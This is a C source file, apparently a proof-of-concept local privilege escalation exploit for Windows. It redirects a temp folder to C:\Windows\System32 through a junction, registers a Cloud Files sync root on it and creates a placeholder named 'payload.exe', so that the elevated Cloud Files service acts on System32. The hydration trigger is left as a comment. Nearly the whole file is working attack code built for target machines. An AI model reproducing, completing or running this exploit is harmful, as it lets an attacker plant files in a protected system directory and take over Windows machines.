// Cloud Files API junction pivot — research POC.
// Registers a CF sync root on a junction that resolves to a privileged path,
// then triggers a hydration callback so the elevated CF service operates on
// the junction target rather than the original temp dir.
//
// If building in VS: Project -> Properties -> C/C++ -> Precompiled Headers
//                    -> Not Using Precompiled Headers

#define _CRT_SECURE_NO_WARNINGS

#include <Windows.h>
#include <cfapi.h>
#include <stdio.h>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "CldApi.lib")

// Static CRT — prevents "missing MSVCP140.dll" on target machines.
#pragma comment(linker, "/NODEFAULTLIB:msvcrt.lib")
#pragma comment(linker, "/NODEFAULTLIB:msvcrtd.lib")
#ifdef _DEBUG
#pragma comment(lib, "libcmtd.lib")
#else
#pragma comment(lib, "libcmt.lib")
#endif

typedef struct _REPARSE_DATA_BUFFER {
    ULONG  ReparseTag;
    USHORT ReparseDataLength;
    USHORT Reserved;
    struct {
        USHORT SubstituteNameOffset;
        USHORT SubstituteNameLength;
        USHORT PrintNameOffset;
        USHORT PrintNameLength;
        WCHAR  PathBuffer[1];
    } MountPointReparseBuffer;
} REPARSE_DATA_BUFFER;

// Offset to PathBuffer — also the total byte count of the outer + inner headers.
#define REPARSE_HEADER_SIZE FIELD_OFFSET(REPARSE_DATA_BUFFER, MountPointReparseBuffer.PathBuffer)

bool IsRunningAsSystem() {
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) return false;

    DWORD dwSize = 0;
    GetTokenInformation(hToken, TokenUser, NULL, 0, &dwSize);
    PTOKEN_USER pUser = (PTOKEN_USER)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize);

    bool bIsSystem = false;
    if (pUser && GetTokenInformation(hToken, TokenUser, pUser, dwSize, &dwSize))
        bIsSystem = IsWellKnownSid(pUser->User.Sid, WinLocalSystemSid);

    if (pUser) HeapFree(GetProcessHeap(), 0, pUser);
    CloseHandle(hToken);
    return bIsSystem;
}

// Create a junction reparse point on szDir pointing to szTarget.
// szDir must exist; it is redirected in-place (existing contents become inaccessible
// through this path while the junction is set).
bool CreateJunction(const wchar_t* szDir, const wchar_t* szTarget) {
    HANDLE hDir = CreateFileW(szDir, GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING,
        FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT, NULL);
    if (hDir == INVALID_HANDLE_VALUE) return false;

    wchar_t szNtTarget[MAX_PATH];
    swprintf(szNtTarget, MAX_PATH, L"\\??\\%s", szTarget);

    USHORT uTargetLen  = (USHORT)(lstrlenW(szNtTarget) * sizeof(WCHAR));
    // PathBuffer content: SubstituteName + null + PrintName(empty) + null
    USHORT uPathBytes  = uTargetLen + sizeof(WCHAR) + sizeof(WCHAR);
    // Total allocation: headers up to PathBuffer + path content
    USHORT uBufSize    = (USHORT)(REPARSE_HEADER_SIZE + uPathBytes);

    REPARSE_DATA_BUFFER* pBuf = (REPARSE_DATA_BUFFER*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, uBufSize);
    if (!pBuf) { CloseHandle(hDir); return false; }

    // ReparseDataLength = everything after the outer 8-byte header (ReparseTag +
    // ReparseDataLength + Reserved), which is the 4 inner USHORTs + PathBuffer.
    pBuf->ReparseTag                              = IO_REPARSE_TAG_MOUNT_POINT;
    pBuf->ReparseDataLength                       = (USHORT)(uBufSize - UFIELD_OFFSET(REPARSE_DATA_BUFFER, MountPointReparseBuffer));
    pBuf->MountPointReparseBuffer.SubstituteNameOffset = 0;
    pBuf->MountPointReparseBuffer.SubstituteNameLength = uTargetLen;
    pBuf->MountPointReparseBuffer.PrintNameOffset      = uTargetLen + sizeof(WCHAR);
    pBuf->MountPointReparseBuffer.PrintNameLength      = 0;
    memcpy(pBuf->MountPointReparseBuffer.PathBuffer, szNtTarget, uTargetLen);

    DWORD dwRet;
    // Input size = uBufSize (the exact allocation), not ReparseDataLength + REPARSE_HEADER_SIZE.
    // The latter double-counts the inner USHORT fields that REPARSE_HEADER_SIZE already covers.
    bool bOk = DeviceIoControl(hDir, FSCTL_SET_REPARSE_POINT, pBuf, uBufSize, NULL, 0, &dwRet, NULL);

    HeapFree(GetProcessHeap(), 0, pBuf);
    CloseHandle(hDir);
    return bOk;
}

// Remove the reparse point from szDir so it is a plain directory again.
bool RemoveJunction(const wchar_t* szDir) {
    HANDLE hDir = CreateFileW(szDir, GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING,
        FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT, NULL);
    if (hDir == INVALID_HANDLE_VALUE) return false;

    REPARSE_DATA_BUFFER rdb = {};
    rdb.ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
    DWORD dwRet;
    bool bOk = DeviceIoControl(hDir, FSCTL_DELETE_REPARSE_POINT, &rdb,
        REPARSE_GUID_DATA_BUFFER_HEADER_SIZE, NULL, 0, &dwRet, NULL);
    CloseHandle(hDir);
    return bOk;
}

bool SetupCloudSync(const wchar_t* szPath, const wchar_t* szFileName, CF_CONNECTION_KEY* pKey) {
    CF_SYNC_REGISTRATION reg = { sizeof(reg) };
    reg.ProviderName    = L"CloudProvider";
    reg.ProviderVersion = L"1.0";

    CF_SYNC_POLICIES policies = { sizeof(policies) };
    policies.HardLink          = CF_HARDLINK_POLICY_ALLOWED;
    policies.Hydration.Primary = CF_HYDRATION_POLICY_PARTIAL;

    if (FAILED(CfRegisterSyncRoot(szPath, &reg, &policies, CF_REGISTER_FLAG_NONE)))
        return false;

    CF_CALLBACK_REGISTRATION callbacks[] = { { CF_CALLBACK_TYPE_NONE, NULL } };
    if (FAILED(CfConnectSyncRoot(szPath, callbacks, NULL, CF_CONNECT_FLAG_NONE, pKey))) {
        CfUnregisterSyncRoot(szPath);
        return false;
    }

    BYTE dummyId[] = { 0xDE, 0xAD, 0xBE, 0xEF };
    CF_PLACEHOLDER_CREATE_INFO info  = {};
    info.RelativeFileName            = szFileName;
    info.Flags                       = CF_PLACEHOLDER_CREATE_FLAG_MARK_IN_SYNC;
    info.FileIdentity                = dummyId;
    info.FileIdentityLength          = sizeof(dummyId);

    DWORD dwProcessed = 0;
    return SUCCEEDED(CfCreatePlaceholders(szPath, &info, 1, CF_CREATE_FLAG_NONE, &dwProcessed));
}

int main() {
    if (IsRunningAsSystem()) return 0;

    // Base temp dir — the junction is created here BEFORE CF registration so
    // the sync root is established on a path that already resolves via the
    // junction. The CF service then walks in through the junction target.
    wchar_t szWorkDir[MAX_PATH];
    GetTempPathW(MAX_PATH, szWorkDir);
    lstrcatW(szWorkDir, L"RedTeam_Workspace");

    if (!CreateDirectoryW(szWorkDir, NULL) && GetLastError() != ERROR_ALREADY_EXISTS) {
        printf("[-] Failed to create working directory\n");
        return 1;
    }

    // Set the junction BEFORE registering the CF sync root so the service
    // resolves szWorkDir as System32 from the start.
    if (!CreateJunction(szWorkDir, L"C:\\Windows\\System32")) {
        printf("[-] Failed to create junction: %lu\n", GetLastError());
        RemoveDirectoryW(szWorkDir);
        return 1;
    }
    printf("[+] Junction planted: %ws -> C:\\Windows\\System32\n", szWorkDir);

    // szWorkDir now resolves to System32 — register the CF sync root on that path.
    CF_CONNECTION_KEY connectionKey = {};
    if (SetupCloudSync(szWorkDir, L"payload.exe", &connectionKey)) {
        printf("[+] CF sync root registered on junction target\n");
        // Hydration trigger goes here — the callback fires in the elevated
        // CF service context on the junction-resolved path (System32).

        CfDisconnectSyncRoot(connectionKey);
        CfUnregisterSyncRoot(szWorkDir);
    } else {
        printf("[-] CF sync root setup failed: %lu\n", GetLastError());
    }

    // Remove the junction before deleting the directory.
    RemoveJunction(szWorkDir);
    RemoveDirectoryW(szWorkDir);

    return 0;
}
